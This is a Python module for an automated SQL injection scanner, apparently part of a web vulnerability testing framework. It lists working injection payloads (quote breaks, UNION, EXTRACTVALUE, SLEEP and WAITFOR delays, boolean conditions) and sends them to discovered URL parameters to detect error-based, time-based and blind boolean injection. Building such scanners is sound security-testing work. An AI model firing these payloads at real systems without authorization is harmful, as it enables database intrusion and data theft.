"""SQL Injection Scanner"""
from __future__ import annotations
import asyncio, re, time
from typing import List
from core.base_scanner import BaseScanner
from core.models import Finding, ScanState
from config.settings import Severity

ERROR_PAYLOADS = ["'", '"', "''", "\\'", "' OR 1=1--", "' OR 1=1#",
    "1' ORDER BY 100--", "' UNION SELECT NULL--",
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
    "' AND 1=CONVERT(int,'a')--"]

ERROR_SIGNATURES = [
    r"SQL syntax.*?MySQL", r"Warning.*?\Wmysql_", r"MySQLSyntaxErrorException",
    r"ORA-\d{4,5}", r"Oracle.*?Driver",
    r"Microsoft.*?ODBC.*?SQL Server", r"Unclosed quotation mark",
    r"pg_query.*?failed", r"PSQLException", r"org\.postgresql\.",
    r"sqlite3\.OperationalError", r"SQLSTATE", r"DB2 SQL error",
    r"invalid query", r"SQL command not properly ended",
]

TIME_PAYLOADS = [
    ("' AND SLEEP(5)--", 5),
    ("'; WAITFOR DELAY '0:0:5'--", 5),
    ("' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", 5),
]

class SQLInjectionScanner(BaseScanner):
    name = "sql_injection"
    description = "Detects SQL Injection: error-based, blind boolean, time-based"
    tags = ["injection", "owasp-a03"]

    async def run(self, state: ScanState) -> List[Finding]:
        findings = []
        test_cases = [(url, p, "GET", "query")
                      for url, params in state.target.discovered_params.items()
                      for p in params]
        results = await asyncio.gather(*[self._test(u,p,m,i,state) for u,p,m,i in test_cases], return_exceptions=True)
        for r in results:
            if isinstance(r, list): findings.extend(r)
        return findings

    async def _test(self, url, param, method, inject_in, state) -> List[Finding]:
        for payload in ERROR_PAYLOADS:
            resp, raw_req = await self.test_payload(url, method, param, payload, inject_in=inject_in)
            if resp is None: continue
            body = resp.text
            for sig in ERROR_SIGNATURES:
                m = re.search(sig, body, re.IGNORECASE)
                if m:
                    return [self.make_finding(
                        title=f"SQL Injection (Error-based) — {param}",
                        vuln_type="sql_injection_error", severity=Severity.CRITICAL,
                        url=url, parameter=param, method=method, payload=payload,
                        evidence=m.group(0), request=raw_req, response=body[:500],
                        cwe_id="CWE-89", owasp_category="A03:2021 - Injection",
                        description=f"Parameter '{param}' triggers DB error.",
                        poc_steps=[f"1. GET {url}", f"2. Set {param}={payload}", "3. Observe DB error"],
                    )]
        for payload, sleep_sec in TIME_PAYLOADS:
            try:
                t0 = time.monotonic()
                resp, raw_req = await self.test_payload(url, method, param, payload, inject_in=inject_in)
                elapsed = time.monotonic() - t0
                if elapsed >= sleep_sec * 0.8:
                    return [self.make_finding(
                        title=f"Blind SQL Injection (Time-based) — {param}",
                        vuln_type="sql_injection_time_based", severity=Severity.HIGH,
                        url=url, parameter=param, method=method, payload=payload,
                        evidence=f"Response delayed {elapsed:.1f}s (expected {sleep_sec}s)",
                        request=raw_req, response="",
                        cwe_id="CWE-89", owasp_category="A03:2021 - Injection",
                        description=f"Parameter '{param}' causes time delay.",
                    )]
            except Exception as exc:
                self.logger.debug(f"Time-based SQLi test error for {param}: {exc}")
        try:
            r_true, _ = await self.test_payload(url, method, param, "' AND 1=1--", inject_in=inject_in)
            r_false, raw = await self.test_payload(url, method, param, "' AND 1=2--", inject_in=inject_in)
            r_base, _ = await self.test_payload(url, method, param, "1", inject_in=inject_in)
            if r_true and r_false and r_base:
                lt, lf, lb = len(r_true.text), len(r_false.text), len(r_base.text)
                if abs(lt - lb) < 50 and abs(lf - lb) > 100:
                    return [self.make_finding(
                        title=f"Blind SQL Injection (Boolean-based) — {param}",
                        vuln_type="sql_injection_blind_boolean", severity=Severity.HIGH,
                        url=url, parameter=param, method=method, payload="' AND 1=1--",
                        evidence=f"TRUE len={lt}, FALSE len={lf}, baseline={lb}",
                        request=raw, response=r_false.text[:300],
                        cwe_id="CWE-89", owasp_category="A03:2021 - Injection",
                        description="Different response lengths for TRUE/FALSE SQL conditions.",
                    )]
        except Exception as exc:
            self.logger.debug(f"Boolean-based SQLi test error for {param}: {exc}")
        return []
